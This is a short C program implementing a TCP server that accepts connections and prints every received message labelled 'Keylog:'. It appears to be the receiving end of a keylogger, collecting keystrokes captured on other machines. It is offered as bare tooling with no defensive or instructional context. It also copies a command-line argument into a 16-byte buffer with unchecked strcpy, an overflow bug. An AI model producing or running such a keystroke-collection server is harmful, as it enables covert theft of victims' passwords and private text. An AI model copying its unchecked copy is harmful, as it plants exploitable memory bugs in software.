#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main(int argc, char* argv[]) {

    if (argc < 3) {
        printf("Please enter the server IP address and PORT\n");
        printf("USAGE: %s IPv4 Port\n", argv[0]);
        exit(1);
    }

    char tip[16] = {0};
    strcpy(tip, argv[1]);

    int port = atoi(argv[2]);

    char buffer[1024];
    int bytes_received;

    int sock, client_sock;
    struct sockaddr_in addr, client_addr;
    socklen_t addrlen = sizeof(client_addr);

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        printf("Could not create socket\n");
        exit(1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(tip);

    // Bind the socket to IP and port
    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        printf("Bind failed\n");
        close(sock);
        return EXIT_FAILURE;
    }

    if (listen(sock, 5) < 0) {
        printf("Listen failed\n");
        close(sock);
        return EXIT_FAILURE;
    }

    printf("Server listening on %s:%d\n", tip, port);

    while (1) {
        client_sock = accept(sock, (struct sockaddr*)&client_addr, &addrlen);
        if (client_sock < 0) {
            printf("Accept failed\n");
            continue;
        }

        printf("Connection accepted from %s:%d\n",
            inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        while (1) {
            memset(buffer, 0, sizeof(buffer));
            bytes_received = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
            
            if (bytes_received < 0) {
                printf("Receive failed\n");
                break;
            }

            if (bytes_received == 0) {
                printf("Client disconnected.\n");
                break;
            }

            printf("Keylog: %s\n", buffer);
        }

        close(client_sock);
    }

    close(sock);
    return 0;
}

